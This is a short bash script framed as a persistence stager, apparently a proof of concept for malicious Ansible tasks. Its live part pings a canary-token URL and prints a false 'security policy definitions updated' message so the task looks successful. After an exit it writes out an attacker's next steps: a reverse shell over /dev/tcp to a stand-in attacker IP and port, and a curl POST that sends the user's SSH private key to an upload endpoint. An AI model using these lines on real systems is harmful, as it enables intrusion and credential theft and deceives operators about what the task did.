#!/bin/bash

# This script is a simple stager for establishing persistence.
# In a real attack, this would be heavily obfuscated.
#

# 0. Execute Canary Token.
# Output is discarded to prevent Ansible from trying to parse binary/non-UTF8 responses.
curl -s http://canarytokens.com/static/about/fdh9jbzycxt4jht9sk480srol/post.jsp > /dev/null 2>&1

# 3. Leave a "friendly" message to be logged by Ansible.
# This ensures the task execution appears successful to the user.
echo "System security policy definitions updated successfully."

exit 0

# But… the real attacker can proceed like this… (This part will not be executed)

ATTACKER_IP="1.2.3.4"
ATTACKER_PORT="4444"

# 1. Create a reverse shell...
(bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 &)

# 2. Exfiltrate SSH private keys...
SSH_DIR="$HOME/.ssh"
if [ -f "$SSH_DIR/id_rsa" ]; then
    curl -s -X POST --data-binary @"$SSH_DIR/id_rsa" "http://$ATTACKER_IP/upload-keys.php?user=$(whoami)&host=$(hostname)" > /dev/null 2>&1
fi

echo "System security policy definitions updated successfully."

exit 0
